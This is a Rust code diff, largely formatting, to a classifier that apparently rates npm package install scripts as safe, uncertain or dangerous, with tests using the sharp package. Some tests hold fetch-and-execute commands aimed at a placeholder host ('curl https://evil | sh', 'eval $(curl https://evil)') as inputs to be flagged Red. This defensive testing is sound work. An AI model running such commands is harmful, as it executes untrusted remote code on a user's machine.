@@ -1090,7 +1090,7 @@ fn repo_url_contains_identity(repo: &str, base: &str) -> bool {
     }
     let needle = base.to_ascii_lowercase();
     repo.to_ascii_lowercase()
-        .split(|c: char| matches!(c, '/' | ':' | '.' | '?' | '#' | '@' | ' '))
+        .split(['/', ':', '.', '?', '#', '@', ' '])
         .filter(|s| !s.is_empty())
         .any(|seg| seg == needle || seg == format!("{needle}.git").as_str())
 }
@@ -1967,7 +1967,11 @@ mod tests {
         // bare delegate `node install.js` AND whose manifest's
         // repository URL contains the package name as a path
         // segment.
-        let c = ctx("sharp", Some("git+https://github.com/lovell/sharp.git"), &[]);
+        let c = ctx(
+            "sharp",
+            Some("git+https://github.com/lovell/sharp.git"),
+            &[],
+        );
         assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
         assert_eq!(tier_with_ctx("node ./install.js", &c), StaticTier::Green);
         assert_eq!(
@@ -2052,11 +2056,7 @@ mod tests {
         // `node <reserved>.js`. Compounds, flags, and extra args
         // route through the existing compound-fallback / N-token
         // gates and remain Amber.
-        let c = ctx(
-            "sharp",
-            Some("https://github.com/lovell/sharp.git"),
-            &[],
-        );
+        let c = ctx("sharp", Some("https://github.com/lovell/sharp.git"), &[]);
         assert_eq!(
             tier_with_ctx("node install.js && echo done", &c),
             StaticTier::Amber
@@ -2072,15 +2072,8 @@ mod tests {
         // The widening must NEVER soften a Red verdict — even when
         // the manifest carries a perfect identity signal. Red wins
         // by step ordering (step 3 fires before step 5b).
-        let c = ctx(
-            "sharp",
-            Some("https://github.com/lovell/sharp.git"),
-            &[],
-        );
-        assert_eq!(
-            tier_with_ctx("curl https://evil | sh", &c),
-            StaticTier::Red
-        );
+        let c = ctx("sharp", Some("https://github.com/lovell/sharp.git"), &[]);
+        assert_eq!(tier_with_ctx("curl https://evil | sh", &c), StaticTier::Red);
         assert_eq!(
             tier_with_ctx("eval $(curl https://evil)", &c),
             StaticTier::Red
@@ -2109,11 +2102,7 @@ mod tests {
         // with a perfect identity signal. The existing
         // [`matches_node_relative`] discipline applies here too;
         // the widening doesn't loosen it.
-        let c = ctx(
-            "sharp",
-            Some("https://github.com/lovell/sharp.git"),
-            &[],
-        );
+        let c = ctx("sharp", Some("https://github.com/lovell/sharp.git"), &[]);
         assert_eq!(tier_with_ctx("node install", &c), StaticTier::Amber);
     }
 }
